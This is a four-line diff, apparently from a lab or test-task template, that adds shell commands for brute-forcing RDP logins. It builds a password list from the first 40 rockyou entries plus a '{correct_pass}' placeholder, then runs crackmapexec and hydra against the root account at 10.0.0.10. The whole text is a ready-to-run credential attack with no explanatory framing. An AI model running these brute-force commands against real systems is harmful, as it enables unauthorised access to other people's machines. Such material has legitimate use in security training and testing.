@@ -1,0 +1,4 @@
+head -n 40 /usr/share/wordlists/rockyou.txt > pass.list
+echo "{correct_pass}" >> pass.list
+crackmapexec rdp -u root -p pass.list 10.0.0.10 --rdp-timeout 2
+hydra -l root -P pass.list rdp://10.0.0.10
